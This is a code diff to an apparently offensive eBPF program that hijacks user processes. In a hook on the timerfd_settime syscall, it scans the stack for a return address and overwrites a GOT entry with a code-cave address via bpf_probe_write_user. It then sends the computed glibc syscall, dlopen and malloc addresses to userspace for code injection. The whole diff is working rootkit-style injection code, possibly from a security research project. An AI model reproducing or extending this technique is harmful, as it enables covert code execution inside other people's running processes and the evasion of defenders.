@@ -10,6 +10,8 @@
 
 #include "../../../common/constants.h"
 #include "defs.h"
+#include "../../../common/map_common.h"
+#include "../data/ring_buffer.h"
 
 #define OPCODE_JUMP_BYTE_0 0xe8
 #define OPCODE_PLT_JMP_BYTE_0 0xff
@@ -166,15 +168,12 @@ static __always_inline int stack_extract_return_address_plt(__u64 stack){
         __u64 buf = CODE_CAVE_ADDRESS;
         bpf_printk("Now writing to J_ADDR %lx\n", j_addr);
         if(bpf_probe_write_user(j_addr, &buf, sizeof(__u64))<0){
-            bpf_printk("FAILED TO WRITE J\n");
+            //Should not work if RELRO active
+            bpf_printk("FAILED TO WRITE JUMP\n");
         }else{
             __u64 got_addr_new;
             bpf_probe_read_user(&got_addr_new, sizeof(__u64), j_addr);
             bpf_printk("Success, new GOT is %lx", got_addr_new);
-        }
-        bpf_printk("Now writing to CALL_ADDR %lx\n", call_addr);
-        if(bpf_probe_write_user(call_addr, &buf, sizeof(__u64))<0){
-            bpf_printk("FAILED TO WRITE CALL\n");
         }
 
         //Now that we have the address placed in the GOT section we can finally go to the function in glibc
@@ -189,7 +188,7 @@ static __always_inline int stack_extract_return_address_plt(__u64 stack){
             return -1;
         }
         
-        //We got the expected syscall.
+        //We got the expected syscall call in libc. Its format depends on glibc.
         //We put it in an internal map.
         __u64 pid_tgid = bpf_get_current_pid_tgid();
         if(pid_tgid<0){
@@ -205,6 +204,8 @@ static __always_inline int stack_extract_return_address_plt(__u64 stack){
         struct inj_ret_address_data addr;
         addr.libc_syscall_address = (__u64)got_addr;
         addr.stack_ret_address = 0;
+        addr.relro_active = relro_active;
+        bpf_probe_read(&addr.got_address, sizeof(__u64), &j_addr);
         bpf_map_update_elem(&inj_ret_address, &pid_tgid, &addr, BPF_ANY);
 
         return 0;
@@ -254,18 +255,31 @@ int sys_enter_timerfd_settime(struct sys_timerfd_settime_enter_ctx *ctx){
             if(pid_tgid<0){
                 return -1;
             }
-            struct inj_ret_address_data *inj_ret_addr = (struct inj_ret_address_data*) bpf_map_lookup_elem(&inj_ret_address, &pid_tgid);
-            if (inj_ret_addr == NULL ){
+            struct inj_ret_address_data *addr = (struct inj_ret_address_data*) bpf_map_lookup_elem(&inj_ret_address, &pid_tgid);
+            if (addr == NULL){
                 //It means we failed to insert into the map before
                 return -1;
             }
-            struct inj_ret_address_data addr = *inj_ret_addr;
-            addr.stack_ret_address = (__u64)scanner - ii;
-            if(bpf_map_update_elem(&inj_ret_address, &pid_tgid, &addr, BPF_EXIST)<0){
+            //struct inj_ret_address_data addr = *inj_ret_addr;
+            //struct inj_ret_address_data addr;
+            //bpf_probe_read(&addr, sizeof(struct inj_ret_address_data), inj_ret_addr);
+            addr->stack_ret_address = (__u64)scanner - ii;
+            if(bpf_map_update_elem(&inj_ret_address, &pid_tgid, addr, BPF_EXIST)<0){
                 bpf_printk("Failed to insert the return address in bpf map\n");
                 return -1;
             }
-            bpf_printk("Final found return address: %lx\n", addr.stack_ret_address);
+            bpf_printk("Final found return address: %lx\n", addr->stack_ret_address);
+            bpf_printk("GOT address: %lx\n", addr->got_address);
+
+
+             //Tell userspace to perform operations on localized addresses
+            int pid = bpf_get_current_pid_tgid() >> 32;
+            ring_buffer_send_vuln_sys(&rb_comm, pid, addr->libc_syscall_address, 
+                addr->stack_ret_address, addr->libc_syscall_address - GLIBC_OFFSET_MAIN_TO_SYSCALL, 
+                addr->libc_syscall_address - GLIBC_OFFSET_MAIN_TO_SYSCALL + GLIBC_OFFSET_MAIN_TO_DLOPEN,
+                addr->libc_syscall_address - GLIBC_OFFSET_MAIN_TO_SYSCALL + GLIBC_OFFSET_MAIN_TO_MALLOC, 
+                addr->got_address, addr->relro_active);
+
             return 0;
         }
     }
